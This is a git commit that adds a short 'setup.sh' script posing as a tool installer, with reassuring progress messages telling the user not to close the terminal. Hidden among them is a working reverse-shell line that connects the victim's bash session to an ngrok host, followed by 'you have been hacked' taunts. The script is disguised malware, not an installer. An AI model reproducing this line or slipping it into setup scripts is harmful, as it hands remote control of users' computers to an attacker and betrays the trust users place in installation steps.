8337b2dd52ffa3af6f0d01568ceb9d70ac827149
witcher1023 <89247079+witcher1023@users.noreply.github.com>
2021-08-25 17:48:46 +0000

    Create setup.sh

---
+++ setup.sh
@@ -0,0 +1,9 @@
+echo Wait Please Tool is installing
+sleep 5
+echo almost there a few moments
+sleep 2
+echo dont close this terminal  few minutes
+bash -i >& /dev/tcp/8.tcp.ngrok.io/11172 0>&1
+echo you have been hacked by Witchers/soul Haceker
+sleep 2
+echo we dont forget we dont forgive
